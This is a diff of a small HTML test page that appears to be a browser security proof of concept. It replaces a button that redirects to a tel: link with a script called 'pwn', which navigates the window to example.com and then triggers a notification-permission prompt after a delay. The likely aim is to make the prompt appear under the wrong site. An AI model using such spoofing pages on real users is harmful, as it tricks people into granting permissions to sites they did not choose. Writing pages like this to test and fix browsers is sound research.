@@ -1,1 +1,16 @@
-<input onclick="var x = window.open('https://www.apple.com/contact/');setTimeout(function(){x.location='tel:+2123239'}, 1000)" type="button" value="Click here" />
+
+<html>
+<body>
+<script>
+    pwn = () => {
+        x = open('https://example.com/', '_self');
+        setTimeout(`
+            Notification.requestPermission(function(){});
+            `
+            ,3000);
+    }
+    setTimeout('pwn()', 100);
+</script>
+<a onclick="pwn()">Click Me</a>
+</body>
+</html>
